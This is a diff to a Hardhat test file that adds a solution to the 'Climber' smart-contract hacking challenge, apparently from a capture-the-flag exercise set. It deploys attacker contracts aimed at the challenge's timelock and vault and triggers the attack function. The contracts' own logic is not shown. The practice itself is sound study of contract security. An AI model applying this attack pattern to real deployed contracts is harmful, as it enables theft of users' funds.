@@ -53,6 +53,19 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        
+        //Deploy de contratos para el ataque
+        const EvilVaultFactory = await ethers.getContractFactory("ClimberEvilVault");
+        const TimelockAttackerFactory = await ethers.getContractFactory("ClimberTimelockAttacker", attacker);
+        this.evilVault = await EvilVaultFactory.deploy();
+        this.timelockAttacker = await TimelockAttackerFactory.deploy(
+          this.vault.address,
+          this.timelock.address,
+          this.evilVault.address,
+          this.token.address
+        );
+        
+        await this.timelockAttacker.iniciarBatchDeFunciones({gasLimit:1e6});
     });
 
     after(async function () {
